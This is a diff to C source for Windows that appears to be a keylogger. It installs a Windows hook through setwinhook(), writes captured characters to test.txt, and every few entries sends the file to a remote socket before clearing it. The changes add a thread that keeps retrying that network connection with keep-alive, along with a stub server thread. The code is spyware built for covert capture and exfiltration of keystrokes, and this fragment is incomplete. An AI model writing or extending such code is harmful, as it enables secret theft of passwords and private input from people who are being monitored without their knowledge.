@@ -175,24 +175,47 @@ void	save_data(const char *data)
 			_wperror(L" Add \\n at the end of the file failed ");
 		nbChar = 0;
 	}
-	if (countTime > 5)
+	if (my_sock != SOCKET_ERROR)
 	{
-		countTime = 0;
-		send_data(my_sock, file);
+		if (countTime > 5)
+		{
+			countTime = 0;
+			send_data(my_sock, file);
+			if (fclose(file) != 0)
+				_wperror(L"Close file failed");
+			if (_wfopen_s(&file, L"test.txt", L"w+") != 0)
+				_wperror(L" Open file failed ");
+		}
 		if (fclose(file) != 0)
-			_wperror(L"Close file failed");
-		if (_wfopen_s(&file, L"test.txt", L"w+") != 0)
-			_wperror(L" Open file failed ");
+			_wperror(L" Close file failed ");
 	}
-	if (fclose(file) != 0)
-		_wperror(L" Close file failed ");
 	timet1 = timet2;
 	nbChar++;
 }
 
-void no_die_client(void)
+void server(SOCKET *server_sock)
 {
-	printf("je suis bien dans le thread\n");
+	(void)server_sock;
+	return;
+}
+
+void keep_alive_client_and_init(SOCKET *keepalive_sock)
+{
+	printf("normalement je devrais bien etre dans la fonction\n");
+	while (((my_sock = init_socket(&my_sock)) == INVALID_SOCKET) || (my_sock == SOCKET_ERROR))
+	{
+		if (my_sock == INVALID_SOCKET)
+			printf("invalid socket\n");
+		printf("je suis encore dans la boucle init\n");
+		Sleep(1000);
+	}
+
+	if (init_socket(keepalive_sock) == SOCKET_ERROR)
+		return;
+	else
+		if (setsockopt(*keepalive_sock, SOL_SOCKET, SO_KEEPALIVE, "10", sizeof("10")) == SOCKET_ERROR)
+			return;
+	while (1);
 	return;
 }
 
@@ -200,10 +223,15 @@ int	main(void)
 {
 	MSG msg;
 	WSADATA wsadata;
+	HANDLE thread_keepalive;
+	HANDLE thread_server;
+	SOCKET keepalive_sock;
+	SOCKET server_sock;
 
 	WSAStartup(MAKEWORD(2, 0), &wsadata);
-	my_sock = init_socket(my_sock);
-	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)no_die_client, NULL, 0, NULL) == NULL)
+	if ((thread_keepalive = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keep_alive_client_and_init, &keepalive_sock, 0, NULL)) == NULL)
+		return (-1);
+	if ((thread_server = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)server, &server_sock, 0, NULL)) == NULL)
 		return (-1);
 	setwinhook();
 	while (GetMessage(&msg, NULL, 0, 0))
@@ -220,9 +248,11 @@ int	main(void)
 	{
 		printf("failed shutdown\n");
 		closesocket(my_sock);
-		return;
+		return (-1);
 	}
 	closesocket(my_sock);
+	closesocket(keepalive_sock);
+	TerminateThread(thread_keepalive, 0);
 	WSACleanup();
 	return (msg.wParam);
 }
